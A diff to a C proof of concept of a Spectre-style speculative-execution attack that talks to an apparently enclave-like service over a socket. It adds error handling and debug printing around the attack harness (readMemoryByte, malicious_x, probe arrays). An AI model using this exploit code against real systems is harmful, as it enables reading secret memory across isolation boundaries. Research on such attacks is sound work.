@@ -20,6 +20,7 @@
 #include <stdint.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
+#include <sys/mman.h>
 
 #include "MIC.h"
 
@@ -31,15 +32,18 @@
 #endif
 
 
-
 unsigned int array1_size = 16;
 uint8_t unused1[64];
 uint8_t array1dupe[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
 uint8_t unused2[64];
 uint8_t array2[256 * 512];
 
-
-void socket_ecall(ecall_val* eval)
+static void print_ecall(ecall_val* eval)
+{
+	printf("THIS IS CURRENT ECALL PACKET:\n type: %d\n x : %d\n array2: %d\n array1_size: %d\n malicious_x: %d\n",eval->type, eval->x, eval->array2, eval->array1_size, eval->malicious_x);
+}
+	
+int socket_ecall(ecall_val* eval)
 {
 	int client_socket;
 	int port_numb;
@@ -50,7 +54,7 @@ void socket_ecall(ecall_val* eval)
 	client_socket= socket(AF_INET,SOCK_STREAM,0);
 	if(client_socket ==-1){
 		printf("error: socket not created\n");
-		return;
+		return -1;
 	}
 
 	memset(&addr, 0, sizeof(addr));
@@ -63,20 +67,22 @@ void socket_ecall(ecall_val* eval)
 	if(ret==-1){
 		printf("error: connection error\n");
 		close(client_socket);
-		return;
+		return -1;
 	}
 
+	print_ecall(eval);
 	write(client_socket, eval, sizeof(ecall_val));
 	ret=read(client_socket, eval, sizeof(ecall_val));
+	print_ecall(eval);
 	if(ret==-1){
 		printf("error: read error\n");
 		close(client_socket);
-		return;
+		return -1;
 	}
 	else
 	//	printf("Ecall success\n");
 	close(client_socket);
-	return;
+	return 0;
 }
 
 
@@ -90,7 +96,7 @@ void socket_ecall(ecall_val* eval)
  /* Report best guess in value[0] and runner-up in value[1] */
  void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	static int results[256];
-	int tries, i, j, k, mix_i; 
+	int tries, i, j, k, mix_i, check; 
 	unsigned int junk = 0;
 	size_t training_x, x;
 	register uint64_t time1, time2;
@@ -125,7 +131,10 @@ void socket_ecall(ecall_val* eval)
 			eval.array2 = array2;
 			eval.array1_size = &array1_size;
 			eval.malicious_x = NULL;
-			socket_ecall(&eval);
+			check=socket_ecall(&eval);
+			print_ecall(&eval);
+			if(check<0)
+				return;
 		}
 		
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
@@ -176,10 +185,18 @@ int spectre_main(int argc, char **argv) {
 	eval.array1_size = NULL;
 	eval.malicious_x=NULL;
 
-	socket_ecall(&eval);
-	malicious_x = eval.malicious_x;
+	ret=socket_ecall(&eval);
+	if(ret<0)
+		return -1;
 
-	
+	print_ecall(&eval);
+
+	malicious_x = eval.malicious_x;
+/*	if(!malicious_x){
+		print_ecall(&eval);
+		return -1;
+	}
+*/	
 	int i, score[2], len=40;
 	uint8_t value[2];
 	
@@ -210,10 +227,14 @@ int spectre_main(int argc, char **argv) {
 /* Application entry */
 int main(int argc, char *argv[])
 {
- 
-    /* Call the main attack function*/
-    spectre_main(argc, argv); 
 
+    int ret;
+    /* Call the main attack function*/
+    ret=spectre_main(argc, argv); 
+    if(ret<0){
+	    printf("error close THE END\n");
+	    return -1;
+    }
 
     return 0;
 }
